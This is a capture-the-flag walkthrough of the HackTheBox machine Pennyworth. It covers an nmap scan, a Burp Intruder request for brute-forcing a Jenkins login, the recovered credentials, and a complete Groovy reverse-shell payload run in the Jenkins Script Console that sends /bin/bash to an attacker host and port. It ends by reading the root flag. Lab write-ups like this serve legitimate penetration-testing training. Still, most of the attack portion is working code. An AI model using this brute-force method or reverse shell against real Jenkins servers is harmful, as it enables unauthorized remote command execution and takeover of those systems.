---
title: Pennyworth - A HackTheBox machine
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - walkthrough
---

# Pennyworth - A HackTheBox machine 

```bash
nmap -sC -sV $ip -Pn -p-
```

Port 8080 is open and from browser we can see a login page of a jenkin service. Version is not displayed. 

Running this request through Burpsuite intruder

```
POST /j_spring_security_check HTTP/1.1
Host: 10.129.228.92:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 62
Origin: http://10.129.228.92:8080
Connection: close
Referer: http://10.129.228.92:8080/login?from=%2F
Cookie: JSESSIONID.4f24ed31=node0de80ew54idnc17ajfpe13p5hc0.node0
Upgrade-Insecure-Requests: 1

j_username=admin&j_password=!@#$%^&from=%2F&Submit=Sign+in
```

Payload will be in password parameter. You can use several dictionaries. In the sampled request the response will be a 500 response code with Jenkin version visible at the footer: 

```
<div class="page-footer__links page-footer__links--white jenkins_ver"><a rel="noopener noreferrer" href="https://jenkins.io/" target="_blank">Jenkins 2.289.1</a></div>
```

Default password for the service (admin:password) doesn't work. By performing some brute force attack with basic dictionaries, password is root:password

Nice repository for [pentesting jenkins](https://github.com/gquere/pwn_jenkins). I guess there might be several approaches and solutions to this machine. In my case, I used the Script console provided in jenkins with the following payload:

```
String host="myip";
int port=1234;
String cmd="/bin/bash";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

After that:

```bash
whoami
cat /root/flag.txt
```
 
